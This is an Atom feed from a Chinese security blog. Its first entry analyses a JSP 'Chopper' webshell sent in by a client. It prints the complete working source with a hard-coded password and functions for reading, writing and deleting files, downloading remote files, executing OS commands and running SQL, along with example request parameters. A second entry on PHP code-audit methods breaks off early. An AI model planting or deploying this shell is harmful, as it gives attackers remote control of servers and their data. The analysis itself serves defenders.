<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V0W&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/1914f553830167cb3aa7ec868754a4ce</icon>
  <subtitle>仰望01世界，徜徉赛博空间。</subtitle>
  <link href="v0w.top/atom.xml" rel="self"/>
  
  <link href="v0w.top/"/>
  <updated>2020-09-02T09:05:00.305Z</updated>
  <id>v0w.top/</id>
  
  <author>
    <name>V0WKeep3r</name>
    <email>v0wldl@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>jsp webshell分析笔记</title>
    <link href="v0w.top/2020/09/02/jsp-webshell/"/>
    <id>v0w.top/2020/09/02/jsp-webshell/</id>
    <published>2020-09-01T16:00:00.000Z</published>
    <updated>2020-09-02T09:05:00.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天突然接到一个任务，称客户需要分析一个webshell，于是放在手边的工作来看一看，发现这是一个jsp经典的菜刀木马。简单分析一个每个函数的功能吧。</p><h1 id="0x01-webshell文件分析"><a href="#0x01-webshell文件分析" class="headerlink" title="0x01 webshell文件分析"></a>0x01 webshell文件分析</h1><p>所传webshell为<code>webshell.jpg</code>文件，通过<code>010editor</code>发现，并未对文件进行编码和加密，只是修改了文件名。</p><p>对<code>webshell.jsp</code>代码每一个方法的分析如下：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;      </span><br><span class="line">&lt;%!String Pwd = <span class="string">&quot;QWEasd123&quot;</span>;                     <span class="comment">//webshell密码</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">EC</span><span class="params">(String s, String c)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;<span class="comment">//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//依照给定的参数s连接数据库</span></span><br><span class="line">    <span class="function">Connection <span class="title">GC</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);                    <span class="comment">//以回车符\r\n作为分割</span></span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim()).newInstance();               <span class="comment">//第一行是数据库驱动类名</span></span><br><span class="line">        Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim());<span class="comment">//第二行是jdbc的url</span></span><br><span class="line">        <span class="keyword">if</span> (x.length &gt; <span class="number">2</span>) &#123;                                  <span class="comment">//第三行(如果有的话)指定了具体的数据库名</span></span><br><span class="line">            c.setCatalog(x[<span class="number">2</span>].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到系统中所有根目录下的每一个文件的名字的前两个字母，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AA</span><span class="params">(StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File r[] = File.listRoots();                            <span class="comment">// 获取根目录文件名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;                    </span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));    <span class="comment">// 每个文件的前两个字母，写入StringBuffer</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到指定路径下所有文件的 文件名、最后一次修改时间、文件大小、是否可读可写属性，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">BB</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File oF = <span class="keyword">new</span> File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = <span class="keyword">new</span> java.util.Date(l[i].lastModified());       <span class="comment">//最后一次修改时间</span></span><br><span class="line">            sT = fm.format(dt);                      <span class="comment">// 修改时间按照格式yyyy-MM-dd HH:mm:ss 写入dt</span></span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;             <span class="comment">// 可读写R</span></span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;          <span class="comment">// 可写写W</span></span><br><span class="line">            <span class="keyword">if</span> (l[i].isDirectory()) &#123;                   <span class="comment">// 判断是否为目录</span></span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()</span><br><span class="line">                        + <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF += l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + sQ + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//迭代删除给定路径下的所有文件和文件夹</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">EE</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将指定路径的文件以流的形式写到response里面</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">FF</span><span class="params">(String s, HttpServletResponse r)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GG</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d</span><br><span class="line">                            .charAt(i + <span class="number">1</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将s指定的文件的内容写到d指定的文件里面。如果s指定的是一个文件夹，那么就将s目录下的所有文件拷贝到d目录下</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HH</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        <span class="keyword">if</span> (sf.isDirectory()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = <span class="keyword">new</span> FileOutputStream(df);</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//更改文件名</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">II</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建目录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">JJ</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改文件的最后修改时间这个属性</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">KK</span><span class="params">(String s, String t)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s参数为url,将url的内容写入d参数指定的文件中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LL</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(s);</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将流一行一行写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MM</span><span class="params">(InputStream is, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到所有的数据库的名称，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">NN</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取数据库所有的表，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OO</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; <span class="string">&quot;TABLE&quot;</span> &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">&quot;%&quot;</span>, t);</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s的前三行参数同GC()方法，第四行为表名，得到该表的每一列的列名和类型，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PP</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[<span class="number">3</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)</span><br><span class="line">                    + <span class="string">&quot;)\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//q为查询的sql语句，将查询的结果写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">QQ</span><span class="params">(String cs, String s, String q, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="keyword">int</span> n = d.getColumnCount();</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//以下为访问URL时带的参数</span></span><br><span class="line">    <span class="comment">//z0：编码</span></span><br><span class="line">    <span class="comment">//Pwd=QWEasd123：可以理解为功能选项,看看下面的代码就知道了</span></span><br><span class="line">    <span class="comment">//z1：普通参数</span></span><br><span class="line">    <span class="comment">//z2：普通参数</span></span><br><span class="line"></span><br><span class="line">    String cs = request.getParameter(<span class="string">&quot;z0&quot;</span>)==<span class="keyword">null</span>?<span class="string">&quot;gbk&quot;</span>: request.getParameter(<span class="string">&quot;z0&quot;</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);                  <span class="comment">//开头的 -&gt;| </span></span><br><span class="line">        <span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;                    <span class="comment">// QWEasd123=A就调用AA函数</span></span><br><span class="line">            String s = <span class="keyword">new</span> File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;             <span class="comment">// QWEasd123=B就调用BB函数</span></span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;             <span class="comment">// QWEasd123=C就调用CC函数</span></span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(</span><br><span class="line">                            z1))));</span><br><span class="line">            <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;             <span class="comment">// QWEasd123=D就调用DD函数</span></span><br><span class="line">            BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line">                    <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(</span><br><span class="line">                            <span class="keyword">new</span> File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">// 其他情况出现错误时，显示错误原因</span></span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);<span class="comment">// 结尾的｜&lt;-</span></span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以通过菜刀蚁剑等shell连接工具，对该webshell进行利用，</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024309.png"></p><p>也可以直接利用函数中的参数进行利用：</p><p>比如通过<code>QWEasd123=A</code>调用webshell列目录的功能：</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024714.jpg"></p><p>再如：<code>QWEasd123=B&amp;z1=/</code>列出指定目录的文件和读写权限。</p><p><img src="http://image.v0w.top/Blog/2020-09-02-025317.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天突然接到一个任务，称客户需要分析一个webshell，于是放在手边的工作来看一看，发现这是一个j</summary>
      
    
    
    
    <category term="代码审计" scheme="v0w.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="webshell" scheme="v0w.top/tags/webshell/"/>
    
    <category term="Java" scheme="v0w.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>代码审计常见的三种方法（PHP篇）</title>
    <link href="v0w.top/2020/08/26/CodeAudit-php/"/>
    <id>v0w.top/2020/08/26/CodeAudit-php/</id>
    <published>2020-08-25T16:00:00.000Z</published>
    <updated>2020-09-02T09:01:22.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前也做过一些代码审计，主要语言是PHP，大部分情况下，都是东一榔头西一棒，非常不优雅，甚至有时为了找一个功能点的代码，翻来倒去很久，浪费时间。偶然看见<a href="https://www.sqlsec.com/2020/07/macphp.html">国光0rz的php代码审计环境的搭建</a>，在搭建完之后，我又尝试对<a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光大佬0rz分析过了的一个企业建站系统</a>进行简单复现，得益于代码审计环境尤其是PHP调试环境的搭建，我很快就可以定位到功能点的具体代码，大大缩短寻找功能点代码的时间，提高审计效率。于是记录一下现在的一个审计过程。文章偏小白，大佬轻喷0rz。</p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>环境准备方面，前人之述备矣。参考：</p><p><a href="https://www.sqlsec.com/2020/07/macphp.html">macOS 下优雅地配置 PHP 代码审计环境</a></p><p>环境解决之后，接下来本菜鸡将以新秀企业建站系统为例简述现在的代码审计流程。</p><p>参考链接：<a href="https://www.sqlsec.com/2020/01/sinsiu.html">PHP代码审计初次尝试之新秀企业网站系统</a></p><h1 id="0x02-从代码本身找漏洞"><a href="#0x02-从代码本身找漏洞" class="headerlink" title="0x02 从代码本身找漏洞"></a>0x02 从代码本身找漏洞</h1><p>不知道大家在进行白盒测试的时候，一般使用什么样的方式。我之前一般就比较无脑，直接seay师傅的代码审计工具一上，然后对其检测出来的问题点，挨个查看，再找相应的功能点进行验证。这种方式可能确实能发现很多问题，但是由于seay代码审计工具，是通过找危险函数来判断是否为漏洞点，所以存在<strong>误报率很高的问题</strong>。另一方面，通过代码，想去<strong>反过来找到对应的功能点位置</strong>，实际上是比较<strong>难</strong>的。</p><p>同样的自动化代码审计工具有：</p><ul><li>Seay源代码审计系统</li><li>Fortify SCA</li><li>RIPS</li></ul><p>以Seay源代码审计系统为例：</p><p><img 